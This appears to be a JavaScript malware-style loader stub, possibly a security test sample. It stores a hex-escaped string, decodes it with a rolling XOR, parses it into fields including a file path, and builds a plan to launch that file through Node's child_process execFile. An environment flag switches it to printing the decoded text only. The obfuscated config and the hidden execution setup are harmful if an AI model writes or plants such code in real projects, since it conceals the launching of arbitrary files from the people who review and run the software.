  const moduleShape = Object.freeze({ format: "commonjs" });
  const Material_e36667e7 = "\\x9a\\xa7\\x96\\xea\\x99\\xed\\x88\\xf8\\x8b\\xb6\\xda\\xb5\\xd6\\xb7\\xc3\\xa6\\xf9\\x95\\xfa\\x99\\xf8\\x94\\xb8\\xdc\\xb5\\xc6\\xb6\\xd7\\xa3\\xc0\\xa8\\xf7\\x87\\xf5\\x9a\\xf9\\x9c\\xef\\x9c\\xe0\\x81\\xe5\\x84\\xf4\\x80\\xe5\\x97\\xaa\\xcf\\xb7\\xd2\\xb1\\xd7\\xbe\\xd2\\xb7\\xe8\\x86\\xe9\\x8d\\xe8\\x94\\xe7\\x93\\xf2\\x95\\xf0\\xaf\\xcc\\xa3\\xd6\\xb8\\xcc\\xf1\\xc0\\xbc\\xdf\\xbe\\xd3\\xa3\\xc2\\xab\\xcc\\xa2\\xfd\\x94\\xf0\\xcd\\x83\\xcc\\x88\\xcd\\xe0\\xd1\\xe9\\xdc\\xeb\\xdb\\x98\\xad\\x98\\xe4\\x82\\xeb\\x87\\xe2\\xbd\\xcd\\xac\\xd8\\xb0\\x8d\\xa2\\xd6\\xbb\\xcb\\xe4\\x8c\\xf9\\x97\\xe3\\x91\\xf4\\x87\\xf4\\xd9\\xb7\\xd8\\xbc\\xd9\\xf6\\xd8\\xab\\xdf\\xbe\\xd9\\xbc\\x91\\xa0\\x98\\xad\\x9a\\xaa\\xc9\\xfc\\xc9\\xf9\\xcb\\xfb\\xca\\xe4\\x89\\xe3\\x90";
  const Codec_e36667e7 = "escaped_octets|rolling_xor|ec";

  function load_e36667e7() { return [...Material_e36667e7.matchAll(/\\x([0-9a-f]{2})/gi)].map((item) => Number.parseInt(item[1], 16)); }
  function decode_e36667e7(v_a19c) { let v_e598 = 236; return v_a19c.map((value) => { const decoded = value ^ v_e598; v_e598 = value; return decoded; }); }
  async function recover_e36667e7() {
    const v_c304 = "";
    const v_a19c = load_e36667e7(); let v_b27e = [];
    for (const stage of [decode_e36667e7]) v_b27e = stage(v_a19c);
    void v_c304; return Buffer.from(v_b27e).toString("ascii");
  }
  async function inspect_e36667e7() { return await recover_e36667e7(); }
  async function plan_e36667e7() { const inspect = inspect_e36667e7; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "launch", adapter: "execfile_node", path: fields.file_path, module: "node:child_process" }); }
  void moduleShape; void plan_e36667e7;
  if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_e36667e7());
